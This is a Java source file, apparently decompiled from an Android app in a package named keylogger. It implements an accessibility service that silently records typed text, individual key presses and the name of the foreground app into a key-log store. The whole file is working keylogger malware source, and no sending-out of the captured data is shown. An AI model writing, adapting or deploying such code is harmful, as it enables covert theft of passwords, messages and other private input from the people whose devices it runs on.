package com.example.keylogger;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.util.Log;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import com.facebook.react.views.textinput.ReactEditTextInputConnectionWrapper;

/* loaded from: classes9.dex */
public class MyService extends AccessibilityService {
    KeyLogs keylogs = new KeyLogs();
    String TempText = "";

    @Override // android.accessibilityservice.AccessibilityService
    public void onAccessibilityEvent(AccessibilityEvent event) {
        Log.d("onAccessibilityEvent", "onAccessibilityEvent connected");
        if (event.getEventType() == 16) {
            String text = event.getText().toString();
            String NewChar = getNewChar(text);
            KeyLogs.AddString(NewChar);
        } else {
            String packageName = event.getPackageName().toString();
            KeyLogs.AddString("\nCurrent app:- " + packageName + ReactEditTextInputConnectionWrapper.NEWLINE_RAW_VALUE);
        }
    }

    private String getNewChar(String message) {
        String newCharacter;
        String message2 = message.substring(1, message.length() - 1);
        if (message2.length() > this.TempText.length()) {
            newCharacter = message2.substring(this.TempText.length());
        } else {
            newCharacter = message2;
        }
        this.TempText = message2;
        return newCharacter;
    }

    @Override // android.accessibilityservice.AccessibilityService
    public void onInterrupt() {
    }

    @Override // android.accessibilityservice.AccessibilityService
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = 25;
        info.feedbackType = 1;
        info.notificationTimeout = 100L;
        setServiceInfo(info);
        Log.d("onServiceConnected", "Service connected");
    }

    @Override // android.accessibilityservice.AccessibilityService
    protected boolean onKeyEvent(KeyEvent event) {
        int action = event.getAction();
        int keyCode = event.getKeyCode();
        if (action == 1) {
            switch (keyCode) {
                case 3:
                    KeyLogs.AddString("[HOME]");
                    break;
                case 4:
                    KeyLogs.AddString("[BACK]");
                    break;
                case 59:
                    KeyLogs.AddString("[SHIFT_LEFT]");
                    break;
                case 60:
                    KeyLogs.AddString("[SHIFT_RIGHT]");
                    break;
                case 61:
                    KeyLogs.AddString("[TAB]");
                    break;
                case 67:
                    KeyLogs.AddString("[BackSpace]");
                case 66:
                    KeyLogs.AddString("[Enter]");
                    break;
                case 115:
                    KeyLogs.AddString("[CAPS]");
                    break;
                default:
                    char pressedChar = (char) event.getUnicodeChar();
                    KeyLogs.Add(Character.valueOf(pressedChar));
                    break;
            }
        }
        return super.onKeyEvent(event);
    }
}